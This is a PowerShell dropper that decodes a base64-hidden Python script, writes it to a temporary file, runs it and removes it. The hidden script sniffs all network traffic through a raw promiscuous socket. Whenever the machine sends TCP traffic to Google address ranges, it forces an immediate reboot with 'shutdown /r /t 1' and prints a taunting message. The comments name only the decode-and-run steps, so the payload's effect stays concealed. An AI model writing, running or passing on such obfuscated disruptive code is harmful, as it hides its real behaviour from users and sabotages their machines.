$base64EncodedScript = "aW1wb3J0IGlwYWRkcmVzcwppbXBvcnQgb3MKaW1wb3J0IHNvY2tldAppbXBvcnQgc3RydWN0CmltcG9ydCBzeXMKCkdPT0dMRV9JUF9SQU5HRSA9IFsnOC44LjQuMC8yNCcsICc4LjguOC4wLzI0JywgJzguMzQuMjA4LjAvMjAnLCAnOC4zNS4xOTIuMC8yMCcsICcyMy4yMzYuNDguMC8yMCcsICcyMy4yNTEuMTI4LjAvMTknLCAnMzQuMC4wLjAvMTUnLCAKJzM0LjIuMC4wLzE2JywgJzM0LjMuMC4wLzIzJywgJzM0LjMuMy4wLzI0JywgJzM0LjMuNC4wLzI0JywgJzM0LjMuOC4wLzIxJywgJzM0LjMuMTYuMC8yMCcsICczNC4zLjMyLjAvMTknLCAnMzQuMy42NC4wLzE4JywgJzM0LjMuMTI4LjAvMTcnLCAKJzM0LjQuMC4wLzE0JywgJzM0LjguMC4wLzEzJywgJzM0LjE2LjAuMC8xMicsICczNC4zMi4wLjAvMTEnLCAnMzQuNjQuMC4wLzEwJywgJzM0LjEyOC4wLjAvMTAnLCAnMzUuMTg0LjAuMC8xMycsICczNS4xOTIuMC4wLzE0JywgCiczNS4xOTYuMC4wLzE1JywgJzM1LjE5OC4wLjAvMTYnLCAnMzUuMTk5LjAuMC8xNycsICczNS4xOTkuMTI4LjAvMTgnLCAnMzUuMjAwLjAuMC8xMycsICczNS4yMDguMC4wLzEyJywgJzM1LjIyNC4wLjAvMTInLCAnMzUuMjQwLjAuMC8xMycsIAonNjQuMTUuMTEyLjAvMjAnLCAnNjQuMjMzLjE2MC4wLzE5JywgJzY2LjIyLjIyOC4wLzIzJywgJzY2LjEwMi4wLjAvMjAnLCAnNjYuMjQ5LjY0LjAvMTknLCAnNzAuMzIuMTI4LjAvMTknLCAnNzIuMTQuMTkyLjAvMTgnLCAKJzc0LjExNC4yNC4wLzIxJywgJzc0LjEyNS4wLjAvMTYnLCAnMTA0LjE1NC4wLjAvMTUnLCAnMTA0LjE5Ni4wLjAvMTQnLCAnMTA0LjIzNy4xNjAuMC8xOScsICcxMDcuMTY3LjE2MC4wLzE5JywgJzEwNy4xNzguMTkyLjAvMTgnLCAKJzEwOC41OS44MC4wLzIwJywgJzEwOC4xNzAuMTkyLjAvMTgnLCAnMTA4LjE3Ny4wLjAvMTcnLCAnMTMwLjIxMS4wLjAvMTYnLCAnMTM2LjExMi4wLjAvMTInLCAnMTQyLjI1MC4wLjAvMTUnLCAnMTQ2LjE0OC4wLjAvMTcnLCAKJzE2Mi4yMTYuMTQ4LjAvMjInLCAnMTYyLjIyMi4xNzYuMC8yMScsICcxNzIuMTEwLjMyLjAvMjEnLCAnMTcyLjIxNy4wLjAvMTYnLCAnMTcyLjI1My4wLjAvMTYnLCAnMTczLjE5NC4wLjAvMTYnLCAnMTczLjI1NS4xMTIuMC8yMCcsIAonMTkyLjE1OC4yOC4wLzIyJywgJzE5Mi4xNzguMC4wLzE1JywgJzE5My4xODYuNC4wLzI0JywgJzE5OS4zNi4xNTQuMC8yMycsICcxOTkuMzYuMTU2LjAvMjQnLCAnMTk5LjE5Mi4xMTIuMC8yMicsICcxOTkuMjIzLjIzMi4wLzIxJywgCicyMDcuMjIzLjE2MC4wLzIwJywgJzIwOC42NS4xNTIuMC8yMicsICcyMDguNjguMTA4LjAvMjInLCAnMjA4LjgxLjE4OC4wLzIyJywgJzIwOC4xMTcuMjI0LjAvMTknLCAnMjA5Ljg1LjEyOC4wLzE3JywgJzIxNi41OC4xOTIuMC8xOScsIAonMjE2LjczLjgwLjAvMjAnLCAnMjE2LjIzOS4zMi4wLzE5J10KCmNsYXNzIElQOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIGJ1ZmY9Tm9uZSk6CiAgICAgICAgaGVhZGVyID0gc3RydWN0LnVucGFjaygnPEJCSEhIQkJINHM0cycsIGJ1ZmYpCiAgICAgICAgc2VsZi52ZXIgPSBoZWFkZXJbMF0gPj4gNAogICAgICAgIHNlbGYuaWhsID0gaGVhZGVyWzRdICYgMHhGCiAgICAgICAgc2VsZi50b3MgPSBoZWFkZXJbMV0KICAgICAgICBzZWxmLmxlbiA9IGhlYWRlclsyXQogICAgICAgIHNlbGYuaWQgPSBoZWFkZXJbM10KICAgICAgICBzZWxmLm9mZnNldCA9IGhlYWRlcls0XQogICAgICAgIHNlbGYudHRsID0gaGVhZGVyWzVdCiAgICAgICAgc2VsZi5wcm90b2NvbF9udW0gPSBoZWFkZXJbNl0KICAgICAgICBzZWxmLm51bSA9IGhlYWRlcls3XQogICAgICAgIHNlbGYuc3JjID0gaGVhZGVyWzhdCiAgICAgICAgc2VsZi5kc3QgPSBoZWFkZXJbOV0KCiAgICAgICAgc2VsZi5zcmNfYWRkcmVzcyA9IGlwYWRkcmVzcy5pcF9hZGRyZXNzKHNlbGYuc3JjKQogICAgICAgIHNlbGYuZHN0X2FkZHJlc3MgPSBpcGFkZHJlc3MuaXBfYWRkcmVzcyhzZWxmLmRzdCkKCiAgICAgICAgc2VsZi5wcm90b2NvbF9tYXAgPSB7MTogIklDTVAiLCA2OiAiVENQIiwgMTc6ICJVRFAifQogICAgICAgIHRyeToKICAgICAgICAgICAgc2VsZi5wcm90b2NvbCA9IHNlbGYucHJvdG9jb2xfbWFwW3NlbGYucHJvdG9jb2xfbnVtXQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoJyVzIE5vIHByb3RvY29sIGZvciAlcycgJSAoZSwgc2VsZi5wcm90b2NvbF9udW0pKQogICAgICAgICAgICBzZWxmLnByb3RvY29sID0gc3RyKHNlbGYucHJvdG9jb2xfbnVtKQoKZGVmIHNuaWZmKGhvc3QpOgoKICAgIHNvY2tldF9wcm90b2NvbCA9IHNvY2tldC5JUFBST1RPX0lQCiAgICBzbmlmZmVyID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfUkFXLCBzb2NrZXRfcHJvdG9jb2wpCiAgICBzbmlmZmVyLmJpbmQoKGhvc3QsIDApKQogICAgc25pZmZlci5zZXRzb2Nrb3B0KHNvY2tldC5JUFBST1RPX0lQLCBzb2NrZXQuSVBfSERSSU5DTCwgMSkKICAgIHNuaWZmZXIuaW9jdGwoc29ja2V0LlNJT19SQ1ZBTEwsIHNvY2tldC5SQ1ZBTExfT04pCgogICAgdHJ5OgogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIHJhd19idWZmZXIgPSBzbmlmZmVyLnJlY3Zmcm9tKDY1NTM1KVswXQogICAgICAgICAgICBpcF9oZWFkZXIgPSBJUChyYXdfYnVmZmVyWzA6MjBdKQogICAgICAgICAgICBpZiBpcF9oZWFkZXIucHJvdG9jb2wgPT0gIlRDUCI6CiAgICAgICAgICAgICAgICAjcHJpbnQoJ1Byb3RvY29sOiAlcyAlcyAtPiAlcycgJSAoaXBfaGVhZGVyLnByb3RvY29sLCBpcF9oZWFkZXIuc3JjX2FkZHJlc3MsIGlwX2hlYWRlci5kc3RfYWRkcmVzcykpCiAgICAgICAgICAgICAgICBmb3IgZ29vZ2xlX3JhbmdlIGluIEdPT0dMRV9JUF9SQU5HRToKICAgICAgICAgICAgICAgICAgICBpZiBpcGFkZHJlc3MuaXBfYWRkcmVzcyhpcF9oZWFkZXIuZHN0X2FkZHJlc3MpIGluIGlwYWRkcmVzcy5JUHY0TmV0d29yayhnb29nbGVfcmFuZ2UpOgogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiWW91IGNhcmUgbW9yZSBhYm91dCBHb29nbGUgdGhhbiBtZT8iKQogICAgICAgICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oInNodXRkb3duIC9yIC90IDEiKQogICAgICAgICAgICAKICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICBzbmlmZmVyLmlvY3RsKHNvY2tldC5TSU9fUkNWQUxMLCBzb2NrZXQuUkNWQUxMX09GRikKICAgICAgICBzeXMuZXhpdCgpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgaG9zdG5hbWUgPSBzb2NrZXQuZ2V0aG9zdG5hbWUoKQogICAgaG9zdCA9IHNvY2tldC5nZXRob3N0YnluYW1lKGhvc3RuYW1lKQogICAgc25pZmYoaG9zdCk="

# Decode the script from Base64
$bytes = [System.Convert]::FromBase64String($base64EncodedScript)
$script = [System.Text.Encoding]::ASCII.GetString($bytes)

# Write the script to a temporary file
$tmpFile = [System.IO.Path]::GetTempFileName() + ".py"
[System.IO.File]::WriteAllText($tmpFile, $script)

# Execute the script using the Python interpreter
& "python.exe" $tmpFile

# Clean up the temporary file
Remove-Item $tmpFile
